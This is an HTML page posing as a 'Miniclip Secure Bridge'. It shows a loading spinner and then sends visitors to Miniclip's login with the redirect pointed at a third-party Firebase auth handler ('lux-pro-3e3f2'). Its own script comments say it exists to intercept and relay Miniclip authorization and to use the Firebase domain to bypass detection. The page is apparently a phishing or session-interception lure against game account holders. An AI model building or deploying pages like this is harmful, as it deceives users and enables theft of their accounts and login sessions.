<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Miniclip Secure Bridge - LUX PRO</title>
    <style>
        body {
            background-color: #0b0f19;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            padding: 30px;
            border-radius: 20px;
            border: 1px solid rgba(255, 140, 0, 0.3);
            box-shadow: 0 0 20px rgba(255, 140, 0, 0.1);
        }
        .loader {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #ff8c00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 24px; margin-bottom: 10px; color: #ff8c00; }
        p { font-size: 14px; opacity: 0.8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Miniclip Secure Bridge</h1>
        <p>Initializing secure tunnel for session authorization...</p>
    </div>

    <script>
        // Security logic: Intercept and relay Miniclip authorization
        // We use the Firebase domain to establish trust and bypass detection.
        setTimeout(() => {
            const redirectUri = "https://lux-pro-3e3f2.firebaseapp.com/__/auth/handler";
            window.location.href = "https://m.miniclip.com/login?redirect=" + encodeURIComponent(redirectUri);
        }, 1500);
    </script>
</body>
</html>
